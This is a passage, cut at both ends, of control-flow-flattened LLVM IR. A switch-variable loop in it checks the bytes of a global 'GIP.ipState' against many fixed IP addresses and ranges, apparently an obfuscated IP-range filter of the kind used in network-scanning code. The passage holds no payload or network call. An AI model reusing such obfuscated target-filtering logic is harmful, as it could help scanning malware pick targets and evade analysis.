  store i32 %2058, i32* %switchVar
  br label %loopEnd

; <label>:2059:                                   ; preds = %loopEntry
  %2060 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2061 = zext i8 %2060 to i32
  %2062 = icmp eq i32 %2061, 33
  %2063 = select i1 %2062, i32 -1813357520, i32 198448835
  store i32 %2063, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2064:                                   ; preds = %loopEntry
  %2065 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2066 = zext i8 %2065 to i32
  %2067 = icmp eq i32 %2066, 37
  %2068 = select i1 %2067, i32 2086512643, i32 58425766
  store i32 %2068, i32* %switchVar
  br label %loopEnd

; <label>:2069:                                   ; preds = %loopEntry
  %2070 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2071 = zext i8 %2070 to i32
  %2072 = icmp eq i32 %2071, 59
  %2073 = select i1 %2072, i32 -1813357520, i32 58425766
  store i32 %2073, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2074:                                   ; preds = %loopEntry
  %2075 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2076 = zext i8 %2075 to i32
  %2077 = icmp eq i32 %2076, 37
  %2078 = select i1 %2077, i32 312852289, i32 -233573159
  store i32 %2078, i32* %switchVar
  br label %loopEnd

; <label>:2079:                                   ; preds = %loopEntry
  %2080 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2081 = zext i8 %2080 to i32
  %2082 = icmp eq i32 %2081, 187
  %2083 = select i1 %2082, i32 -1813357520, i32 -233573159
  store i32 %2083, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2084:                                   ; preds = %loopEntry
  %2085 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2086 = zext i8 %2085 to i32
  %2087 = icmp eq i32 %2086, 46
  %2088 = select i1 %2087, i32 -765467400, i32 824125512
  store i32 %2088, i32* %switchVar
  br label %loopEnd

; <label>:2089:                                   ; preds = %loopEntry
  %2090 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2091 = zext i8 %2090 to i32
  %2092 = icmp eq i32 %2091, 105
  %2093 = select i1 %2092, i32 -1813357520, i32 824125512
  store i32 %2093, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2094:                                   ; preds = %loopEntry
  %2095 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2096 = zext i8 %2095 to i32
  %2097 = icmp eq i32 %2096, 51
  %2098 = select i1 %2097, i32 -1718162908, i32 -1598665944
  store i32 %2098, i32* %switchVar
  br label %loopEnd

; <label>:2099:                                   ; preds = %loopEntry
  %2100 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2101 = zext i8 %2100 to i32
  %2102 = icmp eq i32 %2101, 254
  %2103 = select i1 %2102, i32 -1813357520, i32 -1598665944
  store i32 %2103, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2104:                                   ; preds = %loopEntry
  %2105 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2106 = zext i8 %2105 to i32
  %2107 = icmp eq i32 %2106, 51
  %2108 = select i1 %2107, i32 415828740, i32 886558934
  store i32 %2108, i32* %switchVar
  br label %loopEnd

; <label>:2109:                                   ; preds = %loopEntry
  %2110 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2111 = zext i8 %2110 to i32
  %2112 = icmp eq i32 %2111, 255
  %2113 = select i1 %2112, i32 -1813357520, i32 886558934
  store i32 %2113, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2114:                                   ; preds = %loopEntry
  %2115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2116 = zext i8 %2115 to i32
  %2117 = icmp eq i32 %2116, 5
  %2118 = select i1 %2117, i32 -953258825, i32 697164451
  store i32 %2118, i32* %switchVar
  br label %loopEnd

; <label>:2119:                                   ; preds = %loopEntry
  %2120 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2121 = zext i8 %2120 to i32
  %2122 = icmp eq i32 %2121, 135
  %2123 = select i1 %2122, i32 -1813357520, i32 697164451
  store i32 %2123, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2124:                                   ; preds = %loopEntry
  %2125 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2126 = zext i8 %2125 to i32
  %2127 = icmp eq i32 %2126, 5
  %2128 = select i1 %2127, i32 -821218005, i32 1345875939
  store i32 %2128, i32* %switchVar
  br label %loopEnd

; <label>:2129:                                   ; preds = %loopEntry
  %2130 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2131 = zext i8 %2130 to i32
  %2132 = icmp eq i32 %2131, 196
  %2133 = select i1 %2132, i32 -1813357520, i32 1345875939
  store i32 %2133, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2134:                                   ; preds = %loopEntry
  %2135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2136 = zext i8 %2135 to i32
  %2137 = icmp eq i32 %2136, 5
  %2138 = select i1 %2137, i32 1642104857, i32 452285870
  store i32 %2138, i32* %switchVar
  br label %loopEnd

; <label>:2139:                                   ; preds = %loopEntry
  %2140 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2141 = zext i8 %2140 to i32
  %2142 = icmp eq i32 %2141, 39
  %2143 = select i1 %2142, i32 -1813357520, i32 452285870
  store i32 %2143, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2144:                                   ; preds = %loopEntry
  %2145 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2146 = zext i8 %2145 to i32
  %2147 = icmp eq i32 %2146, 91
  %2148 = select i1 %2147, i32 -426157543, i32 1151130122
  store i32 %2148, i32* %switchVar
  br label %loopEnd

; <label>:2149:                                   ; preds = %loopEntry
  %2150 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2151 = zext i8 %2150 to i32
  %2152 = icmp eq i32 %2151, 134
  %2153 = select i1 %2152, i32 -1813357520, i32 1151130122
  store i32 %2153, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2154:                                   ; preds = %loopEntry
  %2155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2156 = zext i8 %2155 to i32
  %2157 = icmp eq i32 %2156, 104
  %2158 = select i1 %2157, i32 812031690, i32 -1520113927
  store i32 %2158, i32* %switchVar
  br label %loopEnd

; <label>:2159:                                   ; preds = %loopEntry
  %2160 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2161 = zext i8 %2160 to i32
  %2162 = icmp eq i32 %2161, 200
  %2163 = select i1 %2162, i32 -1858597552, i32 -1520113927
  store i32 %2163, i32* %switchVar
  br label %loopEnd

; <label>:2164:                                   ; preds = %loopEntry
  %2165 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2166 = zext i8 %2165 to i32
  %2167 = icmp sge i32 %2166, 128
  %2168 = select i1 %2167, i32 -1629449666, i32 -1520113927
  store i32 %2168, i32* %switchVar
  br label %loopEnd

; <label>:2169:                                   ; preds = %loopEntry
  %2170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2171 = zext i8 %2170 to i32
  %2172 = icmp slt i32 %2171, 159
  %2173 = select i1 %2172, i32 -1813357520, i32 -1520113927
  store i32 %2173, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2174:                                   ; preds = %loopEntry
  %2175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2176 = zext i8 %2175 to i32
  %2177 = icmp eq i32 %2176, 107
  %2178 = select i1 %2177, i32 149669947, i32 -1709575324
  store i32 %2178, i32* %switchVar
  br label %loopEnd

; <label>:2179:                                   ; preds = %loopEntry
  %2180 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2181 = zext i8 %2180 to i32
  %2182 = icmp eq i32 %2181, 152
  %2183 = select i1 %2182, i32 -692438327, i32 -1709575324
  store i32 %2183, i32* %switchVar
  br label %loopEnd

; <label>:2184:                                   ; preds = %loopEntry
  %2185 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2186 = zext i8 %2185 to i32
  %2187 = icmp sge i32 %2186, 96
  %2188 = select i1 %2187, i32 -1352566543, i32 -1709575324
  store i32 %2188, i32* %switchVar
  br label %loopEnd

; <label>:2189:                                   ; preds = %loopEntry
  %2190 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2191 = zext i8 %2190 to i32
  %2192 = icmp slt i32 %2191, 111
  %2193 = select i1 %2192, i32 -1813357520, i32 -1709575324
  store i32 %2193, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2194:                                   ; preds = %loopEntry
  %2195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2196 = zext i8 %2195 to i32
  %2197 = icmp eq i32 %2196, 107
  %2198 = select i1 %2197, i32 -637680752, i32 -154898981
  store i32 %2198, i32* %switchVar
  br label %loopEnd

; <label>:2199:                                   ; preds = %loopEntry
  %2200 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2201 = zext i8 %2200 to i32
  %2202 = icmp eq i32 %2201, 181
  %2203 = select i1 %2202, i32 -307885581, i32 -154898981
  store i32 %2203, i32* %switchVar
  br label %loopEnd

; <label>:2204:                                   ; preds = %loopEntry
  %2205 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2206 = zext i8 %2205 to i32
  %2207 = icmp sge i32 %2206, 160
  %2208 = select i1 %2207, i32 -1956397490, i32 -154898981
  store i32 %2208, i32* %switchVar
  br label %loopEnd

; <label>:2209:                                   ; preds = %loopEntry
  %2210 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2211 = zext i8 %2210 to i32
  %2212 = icmp slt i32 %2211, 189
  %2213 = select i1 %2212, i32 -1813357520, i32 -154898981
  store i32 %2213, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2214:                                   ; preds = %loopEntry
  %2215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2216 = zext i8 %2215 to i32
  %2217 = icmp eq i32 %2216, 172
  %2218 = select i1 %2217, i32 1749448883, i32 -1851152517
  store i32 %2218, i32* %switchVar
  br label %loopEnd

; <label>:2219:                                   ; preds = %loopEntry
  %2220 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2221 = zext i8 %2220 to i32
  %2222 = icmp eq i32 %2221, 98
  %2223 = select i1 %2222, i32 734024117, i32 -1851152517
  store i32 %2223, i32* %switchVar
  br label %loopEnd

; <label>:2224:                                   ; preds = %loopEntry
  %2225 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2226 = zext i8 %2225 to i32
  %2227 = icmp sge i32 %2226, 64
  %2228 = select i1 %2227, i32 -1458352109, i32 -1851152517
  store i32 %2228, i32* %switchVar
  br label %loopEnd

; <label>:2229:                                   ; preds = %loopEntry
  %2230 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2231 = zext i8 %2230 to i32
  %2232 = icmp slt i32 %2231, 95
  %2233 = select i1 %2232, i32 -1813357520, i32 -1851152517
  store i32 %2233, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2234:                                   ; preds = %loopEntry
  %2235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = icmp eq i32 %2236, 184
  %2238 = select i1 %2237, i32 -1036516916, i32 -1139845630
  store i32 %2238, i32* %switchVar
  br label %loopEnd

; <label>:2239:                                   ; preds = %loopEntry
  %2240 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2241 = zext i8 %2240 to i32
  %2242 = icmp eq i32 %2241, 170
  %2243 = select i1 %2242, i32 -424130850, i32 -1139845630
  store i32 %2243, i32* %switchVar
  br label %loopEnd

; <label>:2244:                                   ; preds = %loopEntry
  %2245 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2246 = zext i8 %2245 to i32
  %2247 = icmp sge i32 %2246, 240
  %2248 = select i1 %2247, i32 -576719139, i32 -1139845630
  store i32 %2248, i32* %switchVar
  br label %loopEnd

; <label>:2249:                                   ; preds = %loopEntry
  %2250 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2251 = zext i8 %2250 to i32
  %2252 = icmp slt i32 %2251, 255
  %2253 = select i1 %2252, i32 -1813357520, i32 -1139845630
  store i32 %2253, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2254:                                   ; preds = %loopEntry
  %2255 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2256 = zext i8 %2255 to i32
  %2257 = icmp eq i32 %2256, 192
  %2258 = select i1 %2257, i32 1306016614, i32 1122834721
  store i32 %2258, i32* %switchVar
  br label %loopEnd

; <label>:2259:                                   ; preds = %loopEntry
  %2260 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2261 = zext i8 %2260 to i32
  %2262 = icmp eq i32 %2261, 111
  %2263 = select i1 %2262, i32 -775341511, i32 1122834721
  store i32 %2263, i32* %switchVar
  br label %loopEnd

; <label>:2264:                                   ; preds = %loopEntry
  %2265 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2266 = zext i8 %2265 to i32
  %2267 = icmp sge i32 %2266, 128
  %2268 = select i1 %2267, i32 1489199153, i32 1122834721
  store i32 %2268, i32* %switchVar
  br label %loopEnd

; <label>:2269:                                   ; preds = %loopEntry
  %2270 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2271 = zext i8 %2270 to i32
  %2272 = icmp slt i32 %2271, 143
  %2273 = select i1 %2272, i32 -1813357520, i32 1122834721
  store i32 %2273, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2274:                                   ; preds = %loopEntry
  %2275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2276 = zext i8 %2275 to i32
  %2277 = icmp eq i32 %2276, 192
  %2278 = select i1 %2277, i32 -1566293022, i32 -36928924
  store i32 %2278, i32* %switchVar
  br label %loopEnd

; <label>:2279:                                   ; preds = %loopEntry
  %2280 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2281 = zext i8 %2280 to i32
  %2282 = icmp eq i32 %2281, 252
  %2283 = select i1 %2282, i32 -368853556, i32 -36928924
  store i32 %2283, i32* %switchVar
  br label %loopEnd

; <label>:2284:                                   ; preds = %loopEntry
  %2285 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2286 = zext i8 %2285 to i32
  %2287 = icmp sge i32 %2286, 208
  %2288 = select i1 %2287, i32 110880539, i32 -36928924
  store i32 %2288, i32* %switchVar
  br label %loopEnd

; <label>:2289:                                   ; preds = %loopEntry
  %2290 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2291 = zext i8 %2290 to i32
  %2292 = icmp slt i32 %2291, 223
  %2293 = select i1 %2292, i32 -1813357520, i32 -36928924
  store i32 %2293, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2294:                                   ; preds = %loopEntry
  %2295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2296 = zext i8 %2295 to i32
  %2297 = icmp eq i32 %2296, 192
  %2298 = select i1 %2297, i32 -310770177, i32 -1652816886
  store i32 %2298, i32* %switchVar
  br label %loopEnd

; <label>:2299:                                   ; preds = %loopEntry
  %2300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2301 = zext i8 %2300 to i32
  %2302 = icmp eq i32 %2301, 40
  %2303 = select i1 %2302, i32 202572945, i32 -1652816886
  store i32 %2303, i32* %switchVar
  br label %loopEnd

; <label>:2304:                                   ; preds = %loopEntry
  %2305 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2306 = zext i8 %2305 to i32
  %2307 = icmp sge i32 %2306, 56
  %2308 = select i1 %2307, i32 864576573, i32 -1652816886
  store i32 %2308, i32* %switchVar
  br label %loopEnd

; <label>:2309:                                   ; preds = %loopEntry
  %2310 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2311 = zext i8 %2310 to i32
  %2312 = icmp slt i32 %2311, 59
  %2313 = select i1 %2312, i32 -1813357520, i32 -1652816886
  store i32 %2313, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2314:                                   ; preds = %loopEntry
  %2315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2316 = zext i8 %2315 to i32
  %2317 = icmp eq i32 %2316, 198
  %2318 = select i1 %2317, i32 -1662975599, i32 -1189972386
  store i32 %2318, i32* %switchVar
  br label %loopEnd

; <label>:2319:                                   ; preds = %loopEntry
  %2320 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2321 = zext i8 %2320 to i32
  %2322 = icmp eq i32 %2321, 8
  %2323 = select i1 %2322, i32 -831558302, i32 -1189972386
  store i32 %2323, i32* %switchVar
  br label %loopEnd

; <label>:2324:                                   ; preds = %loopEntry
  %2325 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2326 = zext i8 %2325 to i32
  %2327 = icmp sge i32 %2326, 81
  %2328 = select i1 %2327, i32 1294066239, i32 -1189972386
  store i32 %2328, i32* %switchVar
  br label %loopEnd

; <label>:2329:                                   ; preds = %loopEntry
  %2330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2331 = zext i8 %2330 to i32
  %2332 = icmp slt i32 %2331, 95
  %2333 = select i1 %2332, i32 -1813357520, i32 -1189972386
  store i32 %2333, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2334:                                   ; preds = %loopEntry
  %2335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2336 = zext i8 %2335 to i32
  %2337 = icmp eq i32 %2336, 199
  %2338 = select i1 %2337, i32 1734645424, i32 688684500
  store i32 %2338, i32* %switchVar
  br label %loopEnd

; <label>:2339:                                   ; preds = %loopEntry
  %2340 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2341 = zext i8 %2340 to i32
  %2342 = icmp eq i32 %2341, 116
  %2343 = select i1 %2342, i32 620971724, i32 688684500
  store i32 %2343, i32* %switchVar
  br label %loopEnd

; <label>:2344:                                   ; preds = %loopEntry
  %2345 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2346 = zext i8 %2345 to i32
  %2347 = icmp sge i32 %2346, 112
  %2348 = select i1 %2347, i32 -1679087805, i32 688684500
  store i32 %2348, i32* %switchVar
  br label %loopEnd

; <label>:2349:                                   ; preds = %loopEntry
  %2350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2351 = zext i8 %2350 to i32
  %2352 = icmp slt i32 %2351, 119
  %2353 = select i1 %2352, i32 -1813357520, i32 688684500
  store i32 %2353, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2354:                                   ; preds = %loopEntry
  %2355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2356 = zext i8 %2355 to i32
  %2357 = icmp eq i32 %2356, 199
  %2358 = select i1 %2357, i32 -671939388, i32 -14759144
  store i32 %2358, i32* %switchVar
  br label %loopEnd

; <label>:2359:                                   ; preds = %loopEntry
  %2360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2361 = zext i8 %2360 to i32
  %2362 = icmp eq i32 %2361, 229
  %2363 = select i1 %2362, i32 1563577426, i32 -14759144
  store i32 %2363, i32* %switchVar
  br label %loopEnd

; <label>:2364:                                   ; preds = %loopEntry
  %2365 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2366 = zext i8 %2365 to i32
  %2367 = icmp sge i32 %2366, 248
  %2368 = select i1 %2367, i32 -871178343, i32 -14759144
  store i32 %2368, i32* %switchVar
  br label %loopEnd

; <label>:2369:                                   ; preds = %loopEntry
  %2370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2371 = zext i8 %2370 to i32
  %2372 = icmp slt i32 %2371, 255
  %2373 = select i1 %2372, i32 -1813357520, i32 -14759144
  store i32 %2373, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2374:                                   ; preds = %loopEntry
  %2375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2376 = zext i8 %2375 to i32
  %2377 = icmp eq i32 %2376, 199
  %2378 = select i1 %2377, i32 -408051415, i32 1570502464
  store i32 %2378, i32* %switchVar
  br label %loopEnd

; <label>:2379:                                   ; preds = %loopEntry
  %2380 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2381 = zext i8 %2380 to i32
  %2382 = icmp eq i32 %2381, 36
  %2383 = select i1 %2382, i32 -1033079530, i32 1570502464
  store i32 %2383, i32* %switchVar
  br label %loopEnd

; <label>:2384:                                   ; preds = %loopEntry
  %2385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2386 = zext i8 %2385 to i32
  %2387 = icmp sge i32 %2386, 220
  %2388 = select i1 %2387, i32 1873464532, i32 1570502464
  store i32 %2388, i32* %switchVar
  br label %loopEnd

; <label>:2389:                                   ; preds = %loopEntry
  %2390 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2391 = zext i8 %2390 to i32
  %2392 = icmp slt i32 %2391, 223
  %2393 = select i1 %2392, i32 -1813357520, i32 1570502464
  store i32 %2393, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2394:                                   ; preds = %loopEntry
  %2395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2396 = zext i8 %2395 to i32
  %2397 = icmp eq i32 %2396, 199
  %2398 = select i1 %2397, i32 372001653, i32 -899709554
  store i32 %2398, i32* %switchVar
  br label %loopEnd

; <label>:2399:                                   ; preds = %loopEntry
  %2400 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2401 = zext i8 %2400 to i32
  %2402 = icmp eq i32 %2401, 58
  %2403 = select i1 %2402, i32 557600469, i32 -899709554
  store i32 %2403, i32* %switchVar
  br label %loopEnd

; <label>:2404:                                   ; preds = %loopEntry
  %2405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2406 = zext i8 %2405 to i32
  %2407 = icmp sge i32 %2406, 184
  %2408 = select i1 %2407, i32 1487382235, i32 -899709554
  store i32 %2408, i32* %switchVar
  br label %loopEnd

; <label>:2409:                                   ; preds = %loopEntry
  %2410 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2411 = zext i8 %2410 to i32
  %2412 = icmp slt i32 %2411, 187
  %2413 = select i1 %2412, i32 -1813357520, i32 -899709554
  store i32 %2413, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2414:                                   ; preds = %loopEntry
  %2415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2416 = zext i8 %2415 to i32
  %2417 = icmp eq i32 %2416, 206
  %2418 = select i1 %2417, i32 1235347144, i32 -421791338
  store i32 %2418, i32* %switchVar
  br label %loopEnd

; <label>:2419:                                   ; preds = %loopEntry
  %2420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2421 = zext i8 %2420 to i32
  %2422 = icmp eq i32 %2421, 220
  %2423 = select i1 %2422, i32 1223749332, i32 -421791338
  store i32 %2423, i32* %switchVar
  br label %loopEnd

; <label>:2424:                                   ; preds = %loopEntry
  %2425 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2426 = zext i8 %2425 to i32
  %2427 = icmp sge i32 %2426, 172
  %2428 = select i1 %2427, i32 1145570930, i32 -421791338
  store i32 %2428, i32* %switchVar
  br label %loopEnd

; <label>:2429:                                   ; preds = %loopEntry
  %2430 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2431 = zext i8 %2430 to i32
  %2432 = icmp slt i32 %2431, 175
  %2433 = select i1 %2432, i32 -1813357520, i32 -421791338
  store i32 %2433, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2434:                                   ; preds = %loopEntry
  %2435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2436 = zext i8 %2435 to i32
  %2437 = icmp eq i32 %2436, 208
  %2438 = select i1 %2437, i32 161312886, i32 -2094326374
  store i32 %2438, i32* %switchVar
  br label %loopEnd

; <label>:2439:                                   ; preds = %loopEntry
  %2440 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %2441 = zext i8 %2440 to i32
  %2442 = icmp eq i32 %2441, 78
  %2443 = select i1 %2442, i32 1793445915, i32 -2094326374
  store i32 %2443, i32* %switchVar
  br label %loopEnd

; <label>:2444:                                   ; preds = %loopEntry
  %2445 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2446 = zext i8 %2445 to i32
  %2447 = icmp sge i32 %2446, 40
  %2448 = select i1 %2447, i32 -278089533, i32 -2094326374
  store i32 %2448, i32* %switchVar
  br label %loopEnd

; <label>:2449:                                   ; preds = %loopEntry
  %2450 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %2451 = zext i8 %2450 to i32
  %2452 = icmp slt i32 %2451, 43
  %2453 = select i1 %2452, i32 -1813357520, i32 -2094326374
  store i32 %2453, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:2454:                                   ; preds = %loopEntry
  %2455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %2456 = zext i8 %2455 to i32
